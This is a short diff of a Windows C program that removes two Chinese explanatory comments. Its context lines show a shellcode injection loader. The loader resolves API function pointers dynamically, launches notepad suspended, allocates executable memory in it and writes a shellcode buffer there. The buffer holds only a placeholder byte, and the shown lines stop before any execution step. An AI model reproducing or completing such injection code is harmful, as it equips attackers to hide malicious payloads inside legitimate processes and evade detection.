@@ -4,7 +4,7 @@
 
 char shellcode[] = { 0x12 };
 
-// 动态获取API函数指针
+
     typedef BOOL (WINAPI *CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
     typedef DWORD (WINAPI *SuspendThread_t)(HANDLE);
     typedef LPVOID (WINAPI *VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
@@ -26,7 +26,7 @@ int main() {
     siw.cb = sizeof(siw);
     PROCESS_INFORMATION pi = { 0 };
     pCreateProcessW(NULL, L"notepad", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siw, &pi);
-    // 由于已挂起创建，无需再次SuspendThread
+    
     LPVOID lpBuffer = pVirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     pWriteProcessMemory(pi.hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL);
 
